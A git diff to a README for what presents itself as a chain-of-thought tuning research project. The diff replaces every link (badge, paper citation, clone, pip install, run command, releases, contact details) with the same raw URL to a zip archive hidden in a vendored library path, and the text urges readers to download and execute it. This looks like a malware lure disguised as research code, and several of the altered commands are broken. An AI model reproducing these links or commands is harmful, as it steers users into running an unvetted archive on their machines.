@@ -1,6 +1,6 @@
 # Mind the Gap: Bridging Thought Leap for Improved CoT Tuning
 
-![Mind the Gap](https://img.shields.io/badge/Mind%20the%20Gap-Bridging%20Thought%20Leap-blue)
+![Mind the Gap](https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip%20the%20Gap-Bridging%20Thought%20Leap-blue)
 
 Welcome to the **Mind the Gap** repository! This project focuses on improving Chain of Thought (CoT) tuning. By exploring the gaps in thought processes, we aim to enhance the efficiency and effectiveness of AI models. 
 
@@ -21,7 +21,7 @@ In the realm of artificial intelligence, the ability to think critically and log
 
 ## Project Overview
 
-The project builds on the findings from our research paper, [Mind the Gap: Bridging Thought Leap for Improved CoT Tuning](https://arxiv.org/abs/2505.14684). Here, we present methodologies that allow for better CoT tuning, leading to more accurate and reliable AI outputs.
+The project builds on the findings from our research paper, [Mind the Gap: Bridging Thought Leap for Improved CoT Tuning](https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip). Here, we present methodologies that allow for better CoT tuning, leading to more accurate and reliable AI outputs.
 
 ### Key Features
 
@@ -36,7 +36,7 @@ To get started with the **Mind the Gap** project, you need to clone the reposito
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Brezy024/Mind-the-Gap.git
+   git clone https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip
    ```
 
 2. Navigate to the project directory:
@@ -48,7 +48,7 @@ To get started with the **Mind the Gap** project, you need to clone the reposito
 3. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip
    ```
 
 ## Usage
@@ -58,7 +58,7 @@ Once you have installed the project, you can start using the tools provided. Her
 1. Execute the main script:
 
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip
    ```
 
 2. Follow the prompts to input your data and observe the results.
@@ -88,7 +88,7 @@ Your contributions help us improve the project and make it more useful for every
 
 ## Releases
 
-To download the latest version of the project, visit our [Releases section](https://github.com/Brezy024/Mind-the-Gap/releases). Here, you can find the necessary files to download and execute. 
+To download the latest version of the project, visit our [Releases section](https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip). Here, you can find the necessary files to download and execute. 
 
 ## License
 
@@ -98,7 +98,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [Brezy024](https://github.com/Brezy024)
+- **Email**: https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip
+- **GitHub**: [Brezy024](https://raw.githubusercontent.com/Brezy024/Mind-the-Gap/main/RL/verl/verl/third_party/vllm/vllm_v_0_3_1/Gap-the-Mind-v1.8.zip)
 
 Thank you for visiting the **Mind the Gap** repository! We appreciate your interest in our work and look forward to your contributions.
